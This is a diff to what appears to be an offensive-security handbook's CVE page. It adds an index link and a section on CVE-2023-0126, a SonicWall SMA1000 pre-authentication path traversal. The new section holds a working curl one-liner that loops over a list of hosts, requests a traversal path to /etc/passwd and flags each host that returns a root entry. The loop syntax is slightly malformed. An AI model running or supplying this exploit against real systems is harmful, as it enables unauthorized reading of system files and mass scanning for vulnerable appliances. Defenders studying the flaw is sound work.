@@ -20,6 +20,7 @@
 - [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-30190-MS-MSDT-Follina-RCE)
 - [CVE-2022-31214: Firejail LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-31214-Firejail-LPE)
 - [CVE-2022-44268: ImageMagick Arbitrary File Read PoC](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC)
+- [CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-0126-SonicWall-SMA1000-Pre-Authentication-Path-Traversal-Vulnerability)
 - [CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21716-Microsoft-Word-RTF-Font-Table-Heap-Corruption-RCE-PoC-Python-Implementation)
 - [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21746-Windows-NTLM-EoP-LocalPotato-LPE)
 - [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22809-Sudo-Bypass)
@@ -869,6 +870,14 @@ png:- -write uploads/<FILE>.png
 ### Decoding Output
 
 > https://cyberchef.org/#recipe=From_Hex(%27Auto%27)
+
+## CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability
+
+- Firmware 12.4.2
+
+```c
+$ cat <FILE> | while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULNERABLE";done
+```
 
 ## CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)
 
